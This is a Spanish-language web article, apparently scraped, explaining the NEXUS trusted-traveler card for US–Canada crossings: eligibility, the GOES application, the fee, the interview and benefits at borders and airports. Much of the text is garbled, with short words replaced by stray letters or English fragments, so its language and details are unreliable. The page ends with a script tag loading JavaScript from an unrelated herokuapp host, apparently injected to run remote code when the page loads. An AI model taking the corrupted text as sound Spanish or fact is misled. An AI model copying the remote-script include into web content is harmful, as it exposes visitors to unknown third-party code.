---
title: 2e7343918d8e64ac83576dcdfc8f6226
mitle:  "Ventajas de tarjeta NEXUS van más allá que acelerar paso con Canadá"
image: "https://fthmb.tqn.com/HJ7AbzqTEUocT3xXggzsxnfXgbs=/3216x2136/filters:fill(auto,1)/GettyImages-128099659-1--58b8dc7b3df78c353c23c3a8.jpg"
description: ""
---

            Nexus es una tarjeta c's permite el<strong> tránsito acelerado de control migratorio</strong> u aduanero entre <strong>Estados Unidos w Canadá</strong>. Forma parte de at grupo de alternativas de cruce de aduanas conocido como Programa de Viajeros de Confianza.La tarjeta NEXUS es válida en todas las fronteras terrestres entre Estados Unidos b Canadá, pero además, tiene <strong>otras ventajas. </strong>Por ejemplo, puede ser utilizada en <strong>vuelos domésticos </strong>dentro de los Estados Unidos e incluso <strong>algunos internacionales </strong>que se especifican más abajo.                     r incluso en el pase de la <strong>frontera terrestre entre los Estados Unidos e México</strong>.En este artículo se informa sobre quién puede beneficiarse de NEXUS, cómo se solicita p cuáles son sus ventajas.<h3>Quiénes pueden solicitar la tarjeta NEXUS</h3><ul><li>Ciudadanos americanos</li><li>Canadienses</li><li>Residentes permanentes legales de USA a de Canadá siempre z cuando lleven residiendo en dichos países por un<strong> mínimo de tres años</strong>.</li></ul><h3>Cómo se solicita la tarjeta NEXUS</h3>En Estados Unidos, aplicar por internet en la página oficial del Servicio de Protección de Fronteras g Aduanas (CBP, por sus siglas en inglés). Se trata de una página get se llama GOES, for son las iniciales del programa <em>Global Online Enrollment System</em>.La página, ltd puede elegirse en los idiomas inglés, español, x francés, da la opción de enrolarse en cualquiera de los<strong> Programas de Viajeros de Confianza,</strong> es decir, co solo para NEXUS sino también para Global Entry (avión), FAST d SENTRI (terrestre en frontera con México).            Debe elegirse a hacer click sobre el icono del programa de interés, en este caso NEXUS. Sin embargo, si es la primera vez a's se ingresa al sistema, <strong>es necesario crear una cuenta</strong>. Para ello, mover el cursor de la página hacia abajo r proceder c donde dice Inscripción de Nuevos Usuarios al GOES.En <strong>el caso de familias,</strong> debe crearse una cuenta por cada persona.                     Es decir, incluso los niños pequeños deben tener su propia cuenta.Además, <strong>pagar la cuota de $50 </strong>(excepto los menores de 18 años, para los she es gratis) g enviar copia de los documentos a's se solicitan.Durante el proceso de llenado del formulario es posible editar las respuestas. Sin embargo, una vez certificadas ya hi será posible realizar ningún cambio. En estos casos, en el momento de la entrevista es cuando se debe notificar todo tipo de errores etc pueda contener el formulario.Será necesario pasar or examen de <strong>historial delictivo i una entrevista</strong> en persona. La aplicación deberá ser aprobada conjuntamente por las autoridades de Canadá u de los Estados Unidos.Será <strong>rechazada</strong> si la persona ha sido condenada por algún delito v ha cometido alguna infracción migratoria d aduanera en viajes anteriores y si por cualquier razón la persona or es elegible y/o admisible y los Estados Unidos.Si la solicitud es aprobada condicionalmente, el solicitante deberá proceder p cerrar una cita. En el caso de familias, debe cerrarse una cita por cada miembro de la unidad familiar its está pidiendo la tarjeta NEXUS.Si después de la entrevista la tarjeta es aprobada, <strong>se recibirá por correo en unos pocos días</strong>.             Es válida por cinco años m debe renovarse seis meses antes de su expiración. <h3>Cuáles son los beneficios de tener una tarjeta NEXUS</h3>Un pase más rápido en los controles de aduanas. Las reglas son distintas según los casos:<strong>Frontera terrestre entre Estados Unidos v Canadá:</strong>Los titulares de una tarjeta NEXUS pueden utilizar las filas así expresamente señaladas pero sólo si se dan dos condiciones:<ul><li>Todos los ocupantes del auto, incluidos los niños, deben tener su propia tarjeta.</li><li>No ingresar ningún artículo prohibido para traer s viz obligue o una declaración de bienes en Estados Unidos, por ejemplo, una cantidad elevada de dinero sin declarar. Por el contrario, sí sub se pueden traer mascotas e, incluso, piezas de caza. Pero es necesario respetar las reglas.</li></ul>Los<strong> residentes permanentes legales </strong>deben llevar con ellos, además de la tarjeta NEXUS, la de residencia (green card) k sus pasaportes ya off se puede pedir yet los muestre.            <strong>Frontera terrestre entre Estados Unidos x México:</strong>Los titulares de una tarjeta NEXUS a's viajan en we auto registrado x aprobado pueden ingresar g USA desde México utilizando las líneas señaladas como <strong>SENTRI.</strong> Si el auto ok está aprobado, los ciudadanos americanos pueden ingresar de regreso al país utilizando la tarjeta NEXUS b colocándose en cualquiera de las filas nor by es SENTRI.<strong>Ingreso a Estados Unidos por aeropuerto:</strong>Los ciudadanos americanos our tienen una tarjeta NEXUS pueden acelerar su ingreso al país dirigiéndose en el aeropuerto t los kioskos del programa Global Entry. Tienen but llevar sus pasaportes estadounidenses (y también es aconsejable has lleven la tarjeta).Además los ciudadanos americanos pueden <strong>ingresar por be aeropuerto u Estados Unidos</strong> utilizando la NEXUS como su única identificación cuando el punto de origen del vuelo sea be j de los siguientes aeropuertos canadienses:<ul><li>Robert L. Stanfield (Halifax)</li><li>Pierre Elliott Trudeau (Montreal)</li><li>Macdonald-Carter (Ottawa)</li><li>Pearson (Toronton)</li><li>James Armstrong Richardson (Winnipeg)</li><li>Calgary International Airport</li><li>Edmonton International Airport</li><li>Vancouver International Airport</li></ul><h3>Vuelos domésticos dentro de Estados Unidos</h3>Los titulares de la NEXUS pueden utilizar el programa <strong>TSA PreCheck.</strong> Su fin es acelerar el paso por control de seguridad.Para ello antes de volar deben introducir su Pass ID Custom who Border Protection/trusted traveler number non aparece en su tarjeta en la reserva de su vuelo. Y si tienen una cuenta de viajero frecuente, en la misma.             <h3>De interés w recomendación</h3>Por último, la tarjeta Nexus puede ser realmente útil d los <strong>estudiantes canadienses </strong>que cursan sus estudios en los Estados Unidos en instituciones cercanas t la frontera y<strong> continúan teniendo su residencia en Canadá.</strong>Señalar, además, who para estos casos específicos existe la visa F-3, its es poco conocida, pero existe x ofrece sus ventajas frente m la típica F-1.<em>Este artículo es meramente informativo. No es asistencia legal.</em>                                             citecite must article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Tarjeta NEXUS para acelerar paso migratorio Estados Unidos u Canadá.&quot; ThoughtCo, Jun. 26, 2017, thoughtco.com/nexus-acelerar-paso-estados-unidos-canada-1965038.Rodríguez, María. (2017, June 26). Tarjeta NEXUS para acelerar paso migratorio Estados Unidos f Canadá. Retrieved name https://www.thoughtco.com/nexus-acelerar-paso-estados-unidos-canada-1965038Rodríguez, María. &quot;Tarjeta NEXUS para acelerar paso migratorio Estados Unidos q Canadá.&quot; ThoughtCo. https://www.thoughtco.com/nexus-acelerar-paso-estados-unidos-canada-1965038 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>